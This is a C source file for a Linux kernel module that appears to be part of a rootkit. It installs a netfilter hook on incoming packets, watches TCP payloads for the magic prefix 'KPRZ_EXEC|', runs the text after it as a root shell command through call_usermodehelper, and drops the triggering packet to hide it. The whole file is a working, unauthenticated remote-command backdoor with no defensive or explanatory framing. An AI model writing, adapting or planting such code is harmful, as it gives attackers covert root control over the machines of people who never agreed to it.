#include "command_executor.h"
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/kmod.h>

#define MAGIC_COMMAND "KPRZ_EXEC|"
#define MAX_CMD_LEN 256

static struct nf_hook_ops command_executor_ops;

void execute_kernel_command(const char *cmd) {
    char *argv[] = { "/bin/sh", "-c", (char *)cmd, NULL };
    static char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static unsigned int command_executor_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    unsigned char *payload;
    unsigned int payload_len;

    if (!skb)
        return NF_ACCEPT;

    ip_header = ip_hdr(skb);
    if (ip_header->protocol == IPPROTO_TCP) {
        tcp_header = tcp_hdr(skb);
        payload = (unsigned char *)((unsigned char *)tcp_header + (tcp_header->doff * 4));
        payload_len = skb_tail_pointer(skb) - payload;

        if (payload_len >= strlen(MAGIC_COMMAND)) {
            if (memcmp(payload, MAGIC_COMMAND, strlen(MAGIC_COMMAND)) == 0) {
                char *cmd_start = (char *)(payload + strlen(MAGIC_COMMAND));
                size_t cmd_len = payload_len - strlen(MAGIC_COMMAND);

                if (cmd_len > 0 && cmd_len < MAX_CMD_LEN) {
                    char *kernel_cmd = kmalloc(cmd_len + 1, GFP_KERNEL);
                    if (kernel_cmd) {
                        memcpy(kernel_cmd, cmd_start, cmd_len);
                        kernel_cmd[cmd_len] = '\0';
                        execute_kernel_command(kernel_cmd);
                        kfree(kernel_cmd);
                    }
                }
                return NF_DROP;
            }
        }
    }

    return NF_ACCEPT;
}

void setup_command_executor(void) {
    command_executor_ops.hook = command_executor_hook;
    command_executor_ops.pf = PF_INET;
    command_executor_ops.hooknum = NF_INET_PRE_ROUTING;
    command_executor_ops.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &command_executor_ops);
}

void remove_command_executor(void) {
    nf_unregister_net_hook(&init_net, &command_executor_ops);
}
